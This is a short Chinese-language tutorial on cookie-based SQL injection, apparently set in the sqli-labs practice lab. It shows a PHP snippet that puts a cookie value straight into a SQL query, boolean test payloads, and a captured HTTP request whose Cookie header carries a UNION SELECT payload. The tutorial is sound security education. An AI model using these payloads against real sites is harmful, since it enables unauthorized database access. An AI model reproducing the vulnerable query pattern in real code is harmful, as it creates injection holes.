## 0x00 cookie注入原理
COOKIE 注入与 GET、POST 注入区别不大，只是传递的方式不一样。GET 再 url 传递参数、POST 在 POST 正文传递参数和值，COOKIE 在 请求数据包的cookie 头传值。  
get 在 url栏传参， 即使提交的方法是 post 只要在 url 拦上都可以传递 get参数；  
post 在正文里 提交的方法必须存在 post；  
cookie 在请求数据包中，get 和 post方法均可。  

## 0x01 cookie注入代码分析
与其他注入不同的是，cookie注入是把获取的值保存到 $cookie中，然后再拼接到sql中带入查询，造成注入。
```php
$cookie = $_COOKIE['uname'];
$sql = "select * from users where username = '$cookie' limit 0,1";
```

## 0x02 黑盒环境下的cookie注入
cookie 功能多数用于商城购物车，或者用户登录验证，可以对这些功能模块进行测试，抓取 包含 cookie 的数据包进行安全测试。
payload如下：
```sql
uname=admin'+and+1%3d1--+；
uname=admin'+and+1%3d2--+；
```
查看返回页面内容是否一致，即可知道是否存在cookie注入。
使用burp suite抓取当前数据包，修改cookie即可进行注入，详细paylaod不在展示，和联合查询用的是一套。
```bash
GET /Less-20/index.php HTTP/1.1
Host: 192.168.0.101:7766
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.101:7766/Less-20/
Connection: close
Cookie: uname=-admin'union+select+1,2,user()-- ; PHPSESSID=89ja0kepcq3k1hi41elmpk8eg3
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```